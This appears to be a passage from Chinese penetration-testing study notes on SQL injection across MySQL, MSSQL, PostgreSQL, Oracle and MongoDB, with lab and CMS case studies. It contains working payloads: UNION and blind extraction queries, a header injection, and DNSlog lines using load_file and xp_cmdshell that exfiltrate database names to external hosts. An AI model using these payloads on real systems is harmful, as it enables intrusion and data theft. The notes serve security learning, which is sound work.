代入执行：select * from sy_guestbook where gName like '%演示%' +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+%'
但是这种在后面闭合不了。
~~~

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 keyword=关键字 ，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%' 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：
~~~sql
select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'
~~~

#### 编码

~~~bash
编码型&加密型
SQL语句：
数据接受：$b=base64_decode($_GET['base']);     
		$sql="select * from sy_guestbook where id=$b";
http://127.0.0.1:8081/web/news.php?base=MQ==
数据进行编码（加密）后接收处理：
数据以编码（加密）值传递，发送编码值，对方常会进行解码后带入数据在进行SQL执行。在注入的时候，我们也要尝试对注入的payload进行编码后提交。
在注入的时候，需要进行编码后在进行注入：
正常语句：http://127.0.0.1:8081/web/news.php?base=1 UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
经过编码后：http://127.0.0.1:8081/web/news.php?base=MSBVTklPTiBTRUxFQ1QgMSxkYXRhYmFzZSgpLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTc=
~~~

![1645152745503-bbbdd41f-3c2c-4dc8-a91c-587c9eb6f5f6.png](.\SQL注入原理.assets\2504969-20230912132700201-1136210806.png)

#### JOSN

~~~bash
json型  表现形式不一样，提交数据一样的
{“username”:"admin"}    键名和键值
取数据的时候，只会接收admin的值，不会接收双引号。
 
数据表现形式
json:
{"username":"admin","password":"xiaodi"}
常规：
username=admin&password=xiaodi
 
如何注入：
常规：username=admin and 1=1&password=xiaodi
json：{"username":"admin and 1=1","password":"xiaodi"}
json格式，参考：https://baike.baidu.com/item/JSON/2462549?fr=aladdin
~~~

![image-20250114002133599](.\SQL注入原理.assets\image-20250114002133599.png)

json提交数据包格式：

![1645153801540-8ad55800-4afd-4ada-9e08-0f09954b88d1.png](.\SQL注入原理.assets\2504969-20230912132701044-1324697246.png)

json注入payload应该怎么构造呢？

`这里使用到post提交json={"username":"admin' order by 3#"}`

![1645154654636-46df1a5d-f17c-470d-a72e-c4f3d9858569.png](.\SQL注入原理.assets\2504969-20230912132700964-8248436.png)

~~~bash
查询用户和数据库名：
json={"username":"admin' and 1=2 union select 1,database(),user()#"}
~~~

![1645154839886-b16bf86b-aff4-4bab-b285-68fcc7511c23.png](.\SQL注入原理.assets\2504969-20230912132701371-960386351.png)

#### 宽字节注入

![img](.\SQL注入原理.assets\197宽字节注入.png)

如何防止宽字节注入？

- 使用 `mysql_set_charset("GBK")`
- 使用 `mysql_real_escape_string($id)`

~~~bash
SQL注入接收数据，但是数据会出现  /\  这种符号
转义函数：addslashes
\n 换行
\n 字符串，但是电脑以为你是换行
对字符串进行转义，\\n进行转义。
 
%df就可以进行绕过，利用宽字节
原理：利用繁体字或者乱码，来进行占用两个字节。
\ 一个字节
� 两个字节
中文 两个字节
用到了addslashes函数后，再次进行注入的时候
注入payload：http://127.0.0.1:8081/web/news.php?gtpl=simple' order by 17--+
但是实际上的SQL语句执行时候：select * from sy_guestbook where gTpl='simple\' order by 17--+'
对'进行了转义，变成了\'
~~~

![1645161599431-ae19ab75-2b89-4e7f-96ac-bbde5e19a485.png](.\SQL注入原理.assets\2504969-20230912132702184-903833173.png)

~~~bash
利用%df来进行绕过 
访问：http://127.0.0.1:8081/web/news.php?gtpl=simple%df' order by 17--+
执行的SQL语句：select * from sy_guestbook where gTpl='simple�\' order by 17-- '
�就会把后面的\占用了，从而绕过了转义
~~~

![1645161786536-89d2dc62-fc3f-41a3-9a0b-95343bf5ac5b.png](.\SQL注入原理.assets\2504969-20230912132703186-630595389.png)

### 提交方式

#### get

~~~bash
$get=$_GET['g'];
echo $get."<hr>";
~~~

![1645166884030-699c7011-f0ac-45bb-a437-fd23c4c33938.png](.\SQL注入原理.assets\2504969-20230912132809153-1343579030.png)

#### post

~~~bash
$post=$_POST['p'];
echo $post."<hr>";
~~~

![1645167180915-2786a0cf-887c-4e75-be6f-e7b6978050ff.png](.\SQL注入原理.assets\2504969-20230912132809080-1502668678.png)

##### 案例

墨者登录框，登录 抓取数据包

![1645169887160-25f8838e-ed7d-4ee1-83d0-d3ccb69c3fd1.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132810749-1874462335.png)

~~~bash
测试是否有注入点：name=xiaodi' and 1=2&password=xiaodi&login=%B5%C7%C2%BC
~~~

![1645170126773-b9cd8507-1a3a-4931-93eb-997983044c3c.png](.\SQL注入原理.assets\2504969-20230912132810049-903752352.png)

~~~bash
很容易看出，这个登录框是没有注入点的。
SQLmap也可以进行post注入：
1.用数据包进行测试，注入地方*注释(推荐)
2.--data "name=xiaodi&password=xiaodi"
~~~

---

#### cookie

~~~bash
$cookie=$_COOKIE['c'];
echo $cookie."<hr>";
~~~

![1645167312724-9555f6d3-26d8-4cd8-ae25-6cc91791e1bb.png](.\SQL注入原理.assets\2504969-20230912132809941-1771730200.png)

##### 案例

~~~bash
在interface下有一个order.php文件，发现参数接受和SQL执行
参数接受：$cartid = $this->fun->accept('ecisp_order_list', 'C');
SQL执行：$sql = "SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,			color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where";
~~~

![1645179823211-4194de26-d974-424e-af40-183bb89b190b.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132809723-2112204048.png)

~~~bash
转到接收参数的函数accept中
~~~

![1645179988208-7661cf88-07a0-432c-bbf1-5cc3c00518a8.png](.\SQL注入原理.assets\2504969-20230912132810749-407982205.png)

~~~bash
参数接受：$cartid = $this->fun->accept('ecisp_order_list', 'C');为C，所以是cookie接收。
那么如何访问这个文件呢，这个接受参数是定义在function in_list()函数里面
 
代码逻辑的访问：
写代码 访问文件执行
写函数 如果不调用函数，则不能执行（访问函数执行）
那个文件调用了这个函数，或者包含这个文件
进行全局搜索：
~~~

![1645180371119-9bfc1f59-84ff-4bca-947f-1471deadcc17.png](.\SQL注入原理.assets\2504969-20230912132811688-1899610957.png)

~~~bash
但是发现都没有调用in_list()的地方
接下来打开index.php文件
~~~

![1645180626548-4e091945-29e5-47d6-a0c3-1865a031ec8d.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132810305-2108785208.png)

~~~bash
定位indexget函数，发现也是接受函数。继续往下面，发现包含函数include admin_ROOT . "interface/$archive.php";
让$archive.php=order.php，控制$archive的值
 
生成新对象：$mainlist = new mainpage();
in_list()刚好在mainpage类里面
~~~

![1645180838144-08b07f37-60eb-4331-af93-04da2655dbd8.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230912132810585-1896111512.png)

~~~bash
$archive = indexget('ac', 'R');
$action = indexget('at', 'R');
 
if (in_array($archive, array('article', 'forum', 'search', 'bbssearch', 'forummain', 'messmain', 'special', 'respond', 'public', 'scriptout', 'enquiry', 'enquirymain', 'form', 'formmain', 'ordermain', 'membermain', 'member', 'forum', 'order'))) {
		$action = 'in_' . $action;
		if (!file_exists(admin_ROOT . "interface/$archive.php")) {
			exit('Access error!');
		}
		include admin_ROOT . "interface/$archive.php";
		$mainlist = new mainpage();
		if (method_exists($mainlist, $action)) {
			$mainlist->$action();
		} else {
			exit('Access error!');
		}
	} else {
		exit('Access error!');
	}
通过get请求来控制archive的值，让他等于order，从而包含order.php文件。
让ac=order  at=list(代码已经自动加上了in_)
构造访问文件方法：127.0.0.1:8098/index.php?ac=order&at=list
但是payload有点超知识点，关于反序列化的。
~~~

---

#### http头等

| 参数            | 功能                                                         |
| --------------- | ------------------------------------------------------------ |
| User-Agent      | 浏览器向服务器表名自己的身份，使得服务器能够识别客户使用的操作系统，浏览器版本 |
| Cookie          | 网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据 |
| X-Forwarded-For | 简称 XFF 头，它代表客户端，HTTP 请求端真是的 IP              |
| Referer         | 浏览器向 Web 服务器表名自己从哪个页面链接过来的              |
| Host            | 客户端指定自己想访问的 Web 服务器的域名/ IP 地址和端口号     |

~~~bash
<?php
header("Content-Type: text/html; charset=utf-8");
 
$get=$_GET['g'];
$post=$_POST['p'];
$cookie=$_COOKIE['c'];
$request=$_REQUEST['r'];
$host=$_SERVER['HTTP_HOST'];//当前访问URL地址
$user_agent=$_SERVER["HTTP_USER_AGENT"];//浏览器信息
$ip=$_SERVER["HTTP_X_FORWARDED_FOR"];//8.8.8.8
 
echo $get."<hr>";
echo $post."<hr>";
echo $cookie."<hr>";
echo $request."<hr>";
echo $host."<hr>";
echo $user_agent."<hr>";
echo $ip;
?>
~~~

#### SERVER

~~~bash
$request=$_REQUEST['r'];
echo $request."<hr>";
全部请求都接受
~~~

![1645167406859-e904fe99-bf0c-4048-8fcd-333107796d42.png](.\SQL注入原理.assets\2504969-20230912132809312-1632055323.png)

~~~bash
1.后台要记录操作访问IP
IP要进行代码的获取，获取之后，IP会不会记录到数据库中呢？
IP会写到数据库，如果IP能够自定义数据，是不是就能尝试SQL注入。
 
2.网站要根据访问设备给与显示页面（判断浏览器ua头信息）
接收访问UA信息，进行判断。
将各种UA进行数据库整理后，用户访问后对比数据库找那个的UA值来进行判读
 
 
3.网站要进行文件上传，用户登录
由于上传的文件可大可小，如果GET请求不满足，就用POST请求
用户登录，接收账号密码后进行数据库查询后对比（POST）
 
所用到的功能需要：
$host=$_SERVER['HTTP_HOST'];//当前访问URL地址
$user_agent=$_SERVER["HTTP_USER_AGENT"];//浏览器信息
$ip=$_SERVER["HTTP_X_FORWARDED_FOR"];//8.8.8.8
~~~

---

##### 案例

- 实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入

~~~bash
如果在白盒我们应该怎么知道是否接受登录IP呢，可以进行登录尝试。看看会不会限制次数，用什么来记录登录次数。（IP，其他）
IP记录，会记录IP的值来进行限制登录
在admin下里面有一个login.php（提交账号密码），请求给一个logincheck.php进行处理。
~~~

![1645174403821-9e2ccff0-a45e-48ed-afa5-9b232d5e3fc7.png](.\SQL注入原理.assets\2504969-20230912132810571-2019525009.png)

~~~bash
关键性函数getip()：$ip=getip();获取IP地址
关键性执行函数：$sqln="select * from zzcms_login_times where ip='$ip'";
有记录IP的函数，这样就会进行数据库操作
~~~

![1645176134457-bdbb70a0-8f44-4f87-b5e5-26aa55a04b7d.png](.\SQL注入原理.assets\2504969-20230912132810526-1115517915.png)

~~~bash
对getip()进行进一步跟踪，转到声明地方
~~~

![1645176338339-1fbc9c7f-e523-40be-81ac-994d706874cb.png](.\SQL注入原理.assets\2504969-20230912132810710-77342179.png)

~~~bash
关键接受：if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
$ip = getenv("HTTP_X_FORWARDED_FOR"); 
这个可以在数据包上构造，就是X-FORWARDED-FOR:8.8.8.8
这个接受IP并没有过滤，那么可以抓包，进行登录，请求，用X-FORWARDED-FOR:8.8.8.8进行代入注入。
构造payload：X-Forwarded-For:1.2.6.4'union select 1,2,3,4#
~~~

![1645178497838-83fd696c-1854-42e5-baea-c3ade73bb5dc.png](.\SQL注入原理.assets\2504969-20230912132811356-625519517.png)

~~~bash
进行数据库监控，发现关键语句：
select * from zzcms_login_times where ip='1.2.6.4'union select 1,2,3,4#' and count>=5 and unix_timestamp()-unix_timestamp(sendtime)<900
~~~

![1645178546628-438052e3-2b89-4159-b9d9-01289112d1d7.png](.\SQL注入原理.assets\2504969-20230912132811311-1712687695.png)

~~~bash
也可以进行保存数据包，然后进行sqlmap进行注入。
~~~

---

### 执行效果

[第29天：WEB攻防-通用漏洞&SQL注入&增删改查&盲注&延时&布尔&报错 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695947.html)

#### 盲注

盲注就是在注入过程中，获取的数据不能回显至前端页面。
此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
解决：常规的联合查询注入不行的情况
我们可以知道盲注分为以下三类：

* 基于报错的SQL盲注-报错回显

  > floor，updatexml，extractvalue

* 基于布尔的SQL盲注-逻辑判断

  > regexp,like,ascii,left,ord,mid

* 基于时间的SQL盲注-延时判断

  > if,sleep

**盲注步骤**

1. 先用 `count()` 判断个数
2. 再用 `length()` 依次判断各个库名，表名，字段名的长度
3. 用 `ascii()` + `substr()` + `if()` 结合判断出每个字符

~~~perl
参考：
like 'ro%'            #判断ro或ro...是否成立 
regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等
if(条件,5,0)           #条件成立 返回5 反之 返回0
sleep(5)              #SQL语句延时执行5秒
mid(a,b,c)            #从位置b开始，截取a字符串的c位
substr(a,b,c)         #从位置b开始，截取字符串a的c长度
left(database(),1)，database() #left(a,b)从左侧截取a的前b位
length(database())=8  #判断数据库database()名的长度
ord=ascii ascii(x)=97 #判断x的ascii码是否等于97
~~~

#### 报错

[12种报错注入+万能语句 - 简书](https://www.jianshu.com/p/bc35f8dd4f7c)

在页面有可控的输入，但是页面没有信息展示，即使注入了sql命令，也没有任何信息显示，可以利用报错信息将数据输出；在MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：`extractvalue()`、`updatexml()`

* 使用ExtractValue()函数报错注入的原理
  当使用extractvalue(xml_frag, xpath_expr)函数时，若xpath_expr参数不符合xpath格式，就会报错。而~符号(ascii编码值：0x7e)是不存在xpath格式的， 所以一旦在xpath_expr参数中使用~符号，就会产生xpath syntax error (xpath语法错误)，并利用 concat() 函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。通过使用这个方法就可以达到报错注入的目的。

![在这里插入图片描述](.\SQL注入原理.assets\d5b18a66a22d18eca58b01b39a1b5ba2.png)

>  注意：在MySQL 8.0版本中，EXTRACTVALUE()函数已被弃用，并且不推荐使用。替代方案是使用更现代的XML函数和操作符，如XMLQuery、XPATH等。

* 使用UpdateXML()函数报错注入的原理
  UpdateXML(xml_target, xpath_expr, new_xml)函数报错注入的原理和ExtractValue()函数类似

![在这里插入图片描述](.\SQL注入原理.assets\cda73828cbf7d177c9e1e1bb26adf254.png)

* floor()

~~~bash
and (select 1 from (select count(*),concat(user()/*存放要查询的 SQL 语句*/,floor(rand(0)*2))x from information_schema.tables group by x)a);
~~~

#### 布尔

* Boolean型盲注

Boolean是基于真假的判断（true or false），Boolean盲注适用场景是不管输入什么，结果都只返回真或假两种情况。Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。盲注有时需要一个一个字符去猜，因此一些字符串操作的函数经常被用到。

> 布尔盲注使用时分为两个步骤：
>
> - 使用 `length()`函数 判断查询结果的长度
> - 使用 `substr()`函数 截取每一个字符，并穷举出字符内容

~~~bash
# 盲注常用到的sql函数
length()        # 返回查询字符串的长度
mid(a, b, c)    # 截取字符串，从b位置开始(从1开始)，截取字符串a的c位
substr(a, b, c) # 截取字符串，从b位置开始，截取字符串a的c长度
left(a,b)       # 截取字符串，从左侧截取a的前b位
ord()           # 返回字符的ASCII码
ascii()         # 返回字符的ASCII码
~~~

#### 延时

* 时间盲注

时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用sleep函数让mysql执行时间变长，制造时间延迟，通过页面的响应时间来判断条件是否正确。通常与if(expr1,expr2,expr3)语句结合使用（如果expr1是True，则返回expr2，否则返回expr3）
~~~bash
# 判断闭合符号：由于页面无法返回正确或错误的值，所以只能通过if加sleep函来判断闭合
?id=1' and if(1=2, 1, sleep(3))--+        # 判断是否是单引号闭合，如果是页面会延迟响应3秒
?id=1" and sleep(3)--+                    # 也可以直接使用and拼接sleepl来判断
~~~

当判断完是何种闭合方式之后，可以结合`length()`、`ascii()`和`substr()`等函数去进一步判断数据库名长度，数据库名

~~~bash
# 常见的注入语句(Payload)
?id=1' and if(length(database())>8, sleep(2), 0) --+               # 判断数据库名长度
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+    # 通过ASCII码，判断数据库的第一个字母，然后通过改变截取的字符，进一步判断库名
# 判断表名
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),1,1))=101,sleep(2),0) --+
# 判断列名
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name="users" and table_schema=database() limit 0,1),1,1))=105,sleep(2),1) --+
~~~

#### 堆叠注入

[第30天：WEB攻防-通用漏洞&SQL注入&CTF&二次&堆叠&DNS带外 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695948.html)

[Sql注入详解(原理篇)_sql注入攻击的原理-CSDN博客](https://blog.csdn.net/weixin_45954730/article/details/131525362)

[SQL 注入总结 - han个人博客](https://meethanmj.github.io/2019/09/07/sqlSum/#外带查询原理)

[堆叠注入详解 - 渗透测试中心 - 博客园](https://www.cnblogs.com/backlion/p/9721687.html)

* 堆叠注入原理
  Stacked injection汉语翻译过来后，称为堆查询注入，也称之为堆叠注入，顾名思义，就是将语句堆叠在一起进行查询。在PHP中，mysql_multi_query()支持多条sql语句同时执行，分号;是用来表示一条sql语句的结束。当我们在;结束一个sql语句后继续构造下一条语句，使其执行，就构成了堆叠注入。

![在这里插入图片描述](.\SQL注入原理.assets\71d3bf9d61848e26371c5d32ab8a7460.png)

* 堆叠注入的局限性
  堆叠注入的触发条件很苛刻，在实际中遇到的很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句并且目标未对;号进行过滤时才能够使用，在PHP中利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，

#### 二次注入

[第30天：WEB攻防-通用漏洞&SQL注入&CTF&二次&堆叠&DNS带外 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695948.html)

[Sql注入详解(原理篇)_sql注入攻击的原理-CSDN博客](https://blog.csdn.net/weixin_45954730/article/details/131525362)

[SQL 注入总结 - han个人博客](https://meethanmj.github.io/2019/09/07/sqlSum/#外带查询原理)

在第一次进行数据库插入数据的时候，仅仅只是使用了 `addslashes` 或者借助 `get_magic_quotes_gpc` 对其中的特殊字符进行转义，但是 `addslashes` 虽然参数在过滤后会添加 `\` 进行转义，但 `\` 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。

在将数据存入到了数据库中之后，开发者认为数据是可信的，下次需要进行查询的时候，直接从数据库中取出脏数据，没有进行检验和处理，这样会造成 `SQL` 的二次注入。

![img](.\SQL注入原理.assets\194secinjec.png)

二次注入一般无法通过扫描工具、手工注入或黑盒测试去进行，一般是用于白盒测试，原因是漏洞本身产生的原理。二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 语句中导致的注入。二次注入比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。


二次注入原理，主要分为两步：

- 插入恶意数据

  第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

- 引用恶意数据

  将数据存入到数据库中后，开发者认为数据是可信的。下次需要查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验何处理。

##### 案例

- 二次注入-74CMS&网鼎杯2018Unfinish

~~~perl
攻击分为两步：
找回密码应用功能：
我们登录了一个用户，在用户的界面上有找回密码的功能
找回密码逻辑：
得到你的用户名（你要找回谁）
 
没有登录用户，我点找回密码，是不是先要输入你要找回的目标
如果登录了用户，一般网站就直接进入验证过程（知道你是谁了）
接收获取你的用户名，修改密码（查询方式：update）
 
如果我在注册用户名的时候，写的是一个SQL注入的语句。如果修改你的密码，那么相当于username后面加上的是SQL注入代码。
语句：update user set password='xiaodi' where username='xiaosedi';
update user set password='xiaodi' where username=SQL注入代码;
当执行updateSQL语句的时候，就执行了这个漏洞
~~~

---

#### Dnslog注入

[第30天：WEB攻防-通用漏洞&SQL注入&CTF&二次&堆叠&DNS带外 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695948.html)

[Sql注入详解(原理篇)_sql注入攻击的原理-CSDN博客](https://blog.csdn.net/weixin_45954730/article/details/131525362)

[SQL 注入总结 - han个人博客](https://meethanmj.github.io/2019/09/07/sqlSum/#外带查询原理)

解决不回显(反向连接),SQL注入,命令执行,SSRF等

~~~perl
1.平台
http://www.dnslog.cn
http://admin.dnslog.link
http://ceye.io
2.应用场景：
解决不回显，反向连接，SQL注入，命令执行，SSRF等
在平台上申请一个账号，使用者要支持访问这个地址才能使用，如果不支持那就没办法使用。在注入中只有load_file支持这钟类型的注入。
现在举个命令执行的例子：ping %USERNAME%.ez1dw8.dnslog.cn
SQL注入：
select load_file(concat('\\\\',(select database()),'.7logee.dnslog.cn\\aa'));
and (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc')))
命令执行：
ping %USERNAME%.7logee.dnslog.cn
~~~

* Dnslog注入原理

  > 如图，攻击者首先构造注入语句load_file(concat('\\\\',database(),'.test.com\\abc'))，在数据库中database()函数被执行，由concat()函数将执行结果与.test.com\\abc拼接，构成一个新的域名，而mysql中的select load_file()可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。
  > DNS在解析的时候会留下日志，攻击者就是通过读取多级域名的解析日志，来获取数据库信息。

* 如何获取DNS查询记录日志

  > 可以使用开放的Dnslog平台，如：http://www.dnslog.cn、http://ceye.io等，在上http://ceye.io我们可以获取到有关ceye.io的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。

* 使用场景和条件

  > 1、dnslog注入只能用于windows平台，因为load_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。
  > 2、sql的布尔型盲注、时间注入的效率普遍很低且当注入的线程太大容易被waf拦截，并且像一些命令执行，xss以及sql注入攻击有时无法看到回显结果，这时就可以考虑DNSlog注入攻击
  > 3、load_file()函数可以使用，也就是说需要数据库配置文件my.ini中的secure_file_priv=

![img](.\SQL注入原理.assets\197DNS.png)

## MSSQL

参考文章：

[第25天：WEB攻防-通用漏洞&SQL读写注入&MYSQL&MSSQL&PostgreSQL - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695943.html)

与postgresql sql注入类似

##### Dnslog注入

`MSSQL` 下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用`DNSlog` 接收外传的数据。常用的函数有：

- `xp_subdirs`
- `xp_dirtree`
- `xp_fileexist`
- `xp_cmdshell`

前三个存储过程的效果和使用方法几乎一致。

```sql
declare @a varchar(1024);
set @a=db_name();
exec('master..xp_dirtree "//' %2B @a %2B '.o0k708.ceye.io/123"')
```

`xp_cmdshell` 要求必须为 `DBA` 权限下才可使用。

```sql
sp_configure 'show advanced options',1;
reconfigure;
sp_configure 'xp_cmdshell',1;
reconfigure;
declare @a varchar(1024); 
set @a='www.baidu.com';
exec ('master..xp_cmdshell "ping ' %2b @a %2b '.han.9rq9q9.ceye.io" ')
```

## PostgreSQL

参考文章：

这个比较详细：https://www.cnblogs.com/yilishazi/p/14710349.html

[第25天：WEB攻防-通用漏洞&SQL读写注入&MYSQL&MSSQL&PostgreSQL - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695943.html)

[postgresql注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/249371.html)

基本上逻辑思路参考MySQL

1. PostgreSQL注入（注意注释符号--+）
2. 常见的函数查看一些基本信息

~~~sql
SELECT version() #查看版本信息

#查看用户
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;#这里是usename不是username
SELECT getpgusername();


SELECT current_database()  #查看当前数据库
CURRENT_SCHEMA()  #返回的是当前会话的默认模式名称    sqlmap跑注入使用此函数。
~~~

墨者靶场：

![image-20250112205239562](.\SQL注入原理.assets\image-20250112205239562.png)

~~~sql
-测列数：
order by 4
and 1=2 union select null,null,null,null
-测显位：第2，3
and 1=2 union select 'null',null,null,null 错误
and 1=2 union select null,'null',null,null 正常
and 1=2 union select null,null,'null',null 正常
and 1=2 union select null,null,null,'null' 错误
~~~

![image-20250112205602940](.\SQL注入原理.assets\image-20250112205602940.png)

~~~sql
-获取信息：
and 1=2 UNION SELECT null,version(),null,null
and 1=2 UNION SELECT null,current_user,null,null
and 1=2 union select null,current_database(),null,null
~~~

![image-20250112205729198](.\SQL注入原理.assets\image-20250112205729198.png)

![image-20250112210256536](.\SQL注入原理.assets\image-20250112210256536.png)

~~~sql
这个是知道数据库前提下的
# -获取数据库名：
and 1=2 union select null,string_agg(datname,','),null,null from pg_database
~~~



~~~sql
-获取表名：
1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public'
2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables
~~~

![image-20250112210613998](.\SQL注入原理.assets\image-20250112210613998.png)

~~~sql
-获取列：
and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users'
~~~

![image-20250112211045254](.\SQL注入原理.assets\image-20250112211045254.png)

~~~sql
-获取数据：
and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
~~~

![image-20250112211319061](.\SQL注入原理.assets\image-20250112211319061.png)

![image-20250112211415799](.\SQL注入原理.assets\image-20250112211415799.png)

## DB2

参考文章：

[本篇文章是干货，完全讲注入，记得保存 三db2注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/343447.html)

[DB2在渗透中的应用(转载) - micr067 - 博客园](https://www.cnblogs.com/micr067/p/14257664.html)

## sybase

与mmsql类似，sqlmap一把梭

## Oracle

参考文章：

https://www.cnblogs.com/-meditation-/articles/16112589.html

https://www.cnblogs.com/peterpan0707007/p/8242119.html

[第26天：Web攻防-通用漏洞&SQL注入&Sqlmap&Oracle&Mongodb&DB2等 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695944.html)

**oracle基础知识**

~~~sql
//注释符 多行注释:/**/,单行注释:--
1.dual表
此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生。
与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual

2.基本用法
select * from all_tables 查询出所有的表
select * from user_tables 查询出当前用户的表
select*from all_tab_columns 查询出所有的字段
select*from user_tab_columns  查询出当前用户的字段
select*from v$version 查版本

3.rownum=1   (限制查询返回的总行数为一条)
对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。 
我们可以用rownum<3来要求他输出2条数据
~~~



## Mongodb

基础语法：[MongoDB 查询文档 | 菜鸟教程](https://www.runoob.com/mongodb/mongodb-query.html)

参考文章：

[第26天：Web攻防-通用漏洞&SQL注入&Sqlmap&Oracle&Mongodb&DB2等 - 解放者-cracer - 博客园](https://www.cnblogs.com/haorancracker/articles/17695944.html)



墨者靶场：

~~~perl
这类型的数据库在python用的比较多。
启动靶场，发现关键性代码：
$query="var data=db.notice.findOne({'id':'$id'});return data;";这个是SQL执行语句，如果没有关键性代码，那么我们很难闭合这个符号，很难去猜解账号密码。
~~~

![未标题-1.jpg](.\SQL注入原理.assets\1530693387a37838.jpg)

~~~sql
如何构造payload？
正常写法：select * from news where id=1
mdb数据库写法：select * from news where id={('$id')}，需要闭合符号
 
原始语句：db.notice.findOne({'id':'$id'});return data;
如果 ?id=1 order by 2
那么语句就会变成：db.notice.findOne({'id':‘1 order by 2’});return data;，语句不正确。
但是注入语句 ?id=1'}); return ({title:tojson(db),content:'1
那么语句就变成：db.notice.findOne({'id':‘1'}); return ({title:tojson(db),content:'1'});return data; ，就可以进行正常的注入。
测回显：/new_list.php?id=1'}); return ({title:1,content:'2
~~~

![1645012603798-16fa1dce-66cb-4081-94d1-5e38379cd3e5.png](.\SQL注入原理.assets\2504969-20230912132511662-766688999.png)

~~~sql
爆库：  
/new_list.php?id=1'}); return ({title:tojson(db),content:'1
记录数据库：mozhe_cms_Authority
~~~

![1645012647787-2354cc19-fe88-4aea-9bde-d0866bcc7023.png](.\SQL注入原理.assets\2504969-20230912132511880-1624057672.png)

~~~sql
爆表： 
/new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1  
db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。
记录表名："Authority_confidential", "notice", "system.indexes"
~~~

![1645012716133-830d0f7c-4b49-41f9-9904-3f1216639ba7.png](.\SQL注入原理.assets\2504969-20230912132514213-2138427310.png)

~~~sql
爆字段：
/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1
db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据
~~~

![1645012843215-556e310f-922c-4526-8437-5c275faa0d0a.png](.\SQL注入原理.assets\2504969-20230912132514717-445053814.png)